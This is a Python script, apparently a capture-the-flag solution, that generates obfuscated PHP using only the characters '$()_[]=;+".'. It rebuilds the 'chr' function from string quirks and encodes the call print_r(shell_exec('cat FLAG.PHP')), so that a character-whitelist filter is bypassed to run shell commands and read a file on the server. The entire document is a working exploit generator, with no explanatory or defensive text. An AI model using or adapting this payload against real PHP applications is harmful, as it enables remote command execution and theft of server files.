allowed = '$()_[]=;+".'

def var(n: int) -> str:
    return '$' + '_' * n

ctr = var(1)
c_ = var(3)
h_ = var(4)
chr_ = var(1)

bin_limit = 7

def bin_num(k: int) -> str:
    return var(k + 2)

one = bin_num(0)

def encode_num(n: int) -> str:
    return '+'.join(bin_num(k) for k in range(bin_limit) if (1 << k) & n)

def inc(n: int) -> str:
    return f'{ctr}++;' * n

def inc_diff(c1: str, c2: str) -> str:
    return inc(ord(c2) - ord(c1))

header = (f'{one}=[]==[];\
{ctr}=([].[])[{one}+{one}+{one}];\
{inc_diff("a", "c")}\
{c_}={ctr};\
{inc_diff("c", "h")}\
{h_}={ctr};\
{inc_diff("h", "r")}\
{chr_}={c_}.{h_}.{ctr};'
+ ''.join(f'{bin_num(k)}={bin_num(k-1)}+{bin_num(k-1)};' for k in range(1, bin_limit)))

def encode_char(c: str) -> str:
    if c in allowed and c != '"':
        return '"' + c + '"'
    return f'{chr_}({encode_num(ord(c))})'

def encode_str(s: str) -> str:
    return '(' + '.'.join(map(encode_char, s)) + ')'

encoded = header + f'{encode_str("print_r")}({encode_str("shell_exec")}{encode_str("cat FLAG.PHP")});'
assert all(c in allowed for c in encoded)
print(encoded)
